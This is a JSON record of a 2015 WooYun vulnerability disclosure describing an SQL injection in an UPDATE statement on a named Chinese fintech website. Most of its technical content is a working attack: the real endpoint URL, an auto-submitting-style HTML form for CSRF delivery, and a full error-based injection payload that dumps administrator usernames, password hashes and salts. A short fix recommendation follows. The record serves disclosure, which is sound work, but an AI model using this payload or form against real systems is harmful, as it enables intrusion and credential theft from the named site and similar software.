{"id": 29834, "wybug_id": "wooyun-2015-0118152", "wybug_title": "光谷科技金融网某处update语句注入漏洞，可查管理员帐号和md5后的密码", "wybug_corp": "光谷科技金融网", "wybug_author": "漆琪起器", "wybug_date": "2015-06-04 12:11", "wybug_open_date": "2015-07-19 12:12", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-04：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-07-19：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 表单提交参数未做有效性验证，可通过CSRF方式模拟并改变参数，mysql语句未做注入防护，参数中添加`#等符号分割sql，可以重新构造新的sql语句。 详细说明：  请求地址：http://www.ggjrw.com/e/member/zhengce/save.php请求方式：POST请求参数：type：[自行随意填写]提交后即爆出 mysql错误信息，通过改造type参数内容即可以达到sql注入   漏洞证明：  \n<html><head><title>abc</title></head><body><form action='http://www.ggjrw.com/e/member/zhengce/save.php' method='post'>\t<textarea name='type'></textarea>\t<input type='submit' value='go'></form></body></html>\n如上代码:type中写入company`=1 where memberid=136 and(select 2 from(select count(*),concat((select (select (SELECT distinct concat(0x23,username,0x3a,password,0x23,salt,0x23) FROM phome_enewsuser order by userid asc limit 2,1)) from information_schema.tables limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a); #提交即可查看用户名密码，如图\n\n   修复方案：  对用户提交数据增加有效性验证，生产环境关闭报错信息，表单提交增加token校验防止CSRF攻击   版权声明：转载请注明来源 漆琪起器@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}